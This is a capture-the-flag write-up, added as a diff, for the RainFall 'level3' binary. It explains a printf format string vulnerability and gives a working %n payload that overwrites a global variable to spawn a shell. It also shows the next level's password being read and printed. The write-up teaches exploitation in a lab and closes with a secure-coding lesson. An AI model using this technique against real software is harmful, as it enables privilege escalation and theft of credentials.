@@ -1,0 +1,91 @@
+First, let's understand the program by examining the binary's protections and behavior: 
+level3@RainFall:~$ ./level3
+Hello!
+Hello!
+ 
+The program reads input and echoes it back. Let's disassemble the code to understand what's happening: 
+See the assembly code in ressources folder
+
+
+Let's verify what's at address 0x804860d: 
+
+(gdb) x/s 0x804860d
+0x804860d: "/bin/sh"
+ 
+ 
+
+Key observations: 
+
+     The function reads input with fgets(buffer, 512, stdin) - safely bounds the input to 512 bytes
+     It then passes the buffer directly to printf(buffer) - this is a format string vulnerability
+     It checks if a global variable at address 0x804988c equals 64 (0x40)
+     If the condition is met, it executes system("/bin/sh"), which gives us a shell
+     
+
+Let's examine the current value of this global variable: 
+
+(gdb) x/d 0x804988c
+0x804988c: 0
+ 
+
+The vulnerability is in the line printf(buffer). When user input is directly passed to printf() as the format string, it allows us to: 
+
+     Read data from the stack using format specifiers like %x and %s
+     Write data to arbitrary memory locations using %n
+     
+
+The %n format specifier writes the number of characters printed so far to the memory address specified by the corresponding argument. 
+
+Our goal is to set the value of the global variable at 0x804988c to 64 (0x40) to trigger the system("/bin/sh") call. Here's the plan: 
+
+     Place the address 0x804988c at the beginning of our buffer
+     Use format specifiers to output exactly 60 more characters
+     Use %n to write the count (4+60=64) to the address
+     
+
+To reference argument positions directly, we'll use the %n$ syntax where n is the parameter position. 
+
+So now to make our exploit we need to: 
+
+     Place the address 0x804988c at the start of our buffer
+     Print exactly 60 more characters (so total=64)
+     Use %4$n to write the count to the address
+     
+
+Here's the exploit: 
+
+	level3@RainFall:~$ python -c 'import struct; addr=0x804988c; print struct.pack("I", addr) + "%60d" + "%4$n"' > /tmp/format_exploit
+ 
+ 
+
+Let's break down what this does: 
+
+     addr=0x804988c - Sets the target address (our global variable)
+     struct.pack("I", addr) - Converts the address to 4 bytes in little-endian format (\x8c\x98\x04\x08)
+     "%60d" - Outputs a number padded to 60 characters
+     "%4$n" - Writes the count of characters printed so far (64) to the 4th parameter, which is our target address
+     
+
+Now we run the exploit with the '-' before the pipe to keep the pipe open and interact with the shell
+ 
+	 level3@RainFall:~$ cat /tmp/format_string - | ./level3
+	�                                                         512
+	Wait what?!
+	whoami
+	level4
+	cat /home/user/level4/.pass
+	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+
+The format string vulnerability allows us to use printf's %n format specifier to write to memory. Here's the process: 
+
+     We place the address 0x804988c at the beginning of our input
+     When printf(buffer) executes, it interprets our input as a format string
+     The %60d part prints a number padded to 60 characters
+     By the time %4$n is processed, 64 characters have been printed (4 for the address + 60 for the padding)
+     The %4$n writes this count (64) to the 4th parameter, which happens to be our target address
+     The global variable equals 64, the comparison passes, and system("/bin/sh") executes
+     
+
+The key lesson: (Never trust the user !)
+Never pass user-controlled input directly to printf() as a format string. Always use printf("%s", user_input) instead to treat user input as data, not as a format string. 
